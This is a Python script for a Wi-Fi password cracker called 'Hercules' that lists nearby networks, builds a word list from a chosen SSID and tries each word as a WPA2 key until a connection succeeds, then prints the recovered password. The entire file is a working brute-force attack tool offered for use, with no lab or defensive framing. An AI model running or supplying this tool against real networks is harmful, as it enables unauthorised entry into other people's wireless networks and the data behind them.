import os
import os.path
import time
import pywifi
import subprocess
from pywifi import const
from pywifi import Profile
from pywifi import PyWiFi
from wordlistgen import generate_word_list

RED = "\033[1;31m"
GREEN = "\033[0;32m"
BLUE  = "\033[1;34m"
RESET = "\033[0;0m"

print(RED,"""
  ___ ___                             .__                 
 /   |   \   ___________   ____  __ __|  |   ____   ______
/    ~    \_/ __ \_  __ \_/ ___\|  |  \  | _/ __ \ /  ___/
\    Y    /\  ___/|  | \/\  \___|  |  /  |_\  ___/ \___ \ 
 \___|_  /  \___  >__|    \___  >____/|____/\___  >____  >
       \/       \/            \/                \/     \/ 
      """)

print(RESET, "Created By: Agneya Tharun (Vort3xed) | Version: 1.0.0")
wifi = PyWiFi()
ifaces = wifi.interfaces()[0]

# Check the card!
ifaces.scan()
results = ifaces.scan_results()

wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]

def main(ssid, password, num):

    profile = Profile() 
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    time.sleep(0.1)

    # Attempt to connect
    iface.connect(tmp_profile)
    time.sleep(0.35) # 1s

    # Check if a connection is established
    if ifaces.status() == const.IFACE_CONNECTED:
        time.sleep(1)
        print(GREEN,'[*] Crack success!',RESET)
        print(GREEN,'[*] Password is ' + password, RESET)
        time.sleep(1)
        exit()
    else:
        print(RED, '[{}] Crack Failed using {}'.format(num, password))

def pwd(ssid, file):
    num = 0
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            num += 1
            line = line.split("\n")
            pwd = line[0]
            main(ssid, pwd, num)

def menu():
    ssid = input("[*] Enter wifi SSID: ")
    filee = "words.txt"
    if os.path.exists(filee):
        os.remove(filee)
    else:
        print("No current word list found.")
    print(BLUE, "Generating word list...")
    generate_word_list(ssid, filee)

    if os.path.exists(filee):
        print(RESET, "[~] Cracking...")
        pwd(ssid, filee)

    else:
        print(RED,"[-] No Such File.")

def get_nearby_wifi_networks():
    r = subprocess.run(["netsh", "wlan", "show", "network"], capture_output=True, text=True).stdout
    ls = r.split("\n")
    ssids = [k for k in ls if 'SSID' in k]
    return ssids

# Call the method to get and print nearby Wi-Fi networks
print("Nearby networks: ")
print(get_nearby_wifi_networks())

menu()